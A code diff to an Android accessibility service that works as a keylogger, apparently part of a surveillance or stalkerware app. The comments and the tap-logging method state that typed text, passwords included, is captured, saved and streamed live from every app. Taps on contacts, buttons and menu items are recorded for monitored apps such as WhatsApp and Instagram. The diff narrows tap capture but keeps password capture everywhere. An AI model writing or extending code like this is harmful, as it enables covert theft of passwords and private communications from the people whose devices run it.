@@ -915,13 +915,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 return;
             }
 
-            // Keep the service bound so Android can deliver future events, and
-            // process events from EVERY app — not just the packages listed in
-            // Constants.MONITORED_PACKAGES.  Each keylog is persisted by
-            // LogManager (global + per-app file) and pushed to the live feed
-            // for any package.
+            // Keep the service bound so Android can deliver future events, and process
+            // events from EVERY app — not just the packages listed in
+            // Constants.MONITORED_PACKAGES.
+            //
+            // Capture policy:
+            //   • Typed input (TYPE_VIEW_TEXT_CHANGED, password or not) is logged,
+            //     saved and streamed for every app.
+            //   • UI taps (TYPE_VIEW_CLICKED) are logged, saved and streamed only
+            //     for packages listed in Constants.MONITORED_PACKAGES.
             if (packageName.isEmpty()) return;
-            
+
             switch (event.getEventType()) {
 
                 case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
@@ -4181,9 +4185,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Logs a tap/click event for any app.
+     * Logs a tap/click event for an app listed in Constants.MONITORED_PACKAGES.
      *
-     * Captures the visible text or content-description of the tapped node so the
+     * <p>The caller is responsible for the monitored-package check — taps are
+     * never captured for unlisted apps, unlike typed text which is captured
+     * everywhere.
+     *
+     * <p>Captures the visible text or content-description of the tapped node so the
      * keylog shows not just typed characters but also which contacts, buttons, list
      * rows, and menu items the user interacted with.
      *
@@ -4191,8 +4199,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * duplicate entries when the OS fires multiple accessibility click events for a
      * single physical tap (common in WhatsApp, Instagram, and similar apps).
      */
-    private void logClickForApp(AccessibilityEvent event, String packageName) {
-        if (packageName == null || packageName.isEmpty()) return;
+    private void logClickForMonitoredApp(AccessibilityEvent event, String packageName) {
+        if (!isMonitoredPackage(packageName)) return;
         try {
             AccessibilityNodeInfo src = event.getSource();
             String text = "";
